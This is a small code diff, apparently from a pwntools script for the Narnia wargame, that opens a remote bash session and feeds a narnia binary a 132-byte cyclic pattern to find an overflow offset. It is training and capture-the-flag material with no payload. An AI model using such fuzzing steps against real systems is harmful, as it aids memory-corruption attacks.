@@ -12,7 +12,11 @@ def setup():
 
 setup()
 
-shell.download_file('/narnia/{}'.format(user))
+s = shell.run('bash')
+s.recvuntil('$ ').decode()
+s.sendline('/narnia/{} {}'.format(user, cyclic(132)))
+
+log.info(s.recvuntil('$ ').decode())
 
 
 
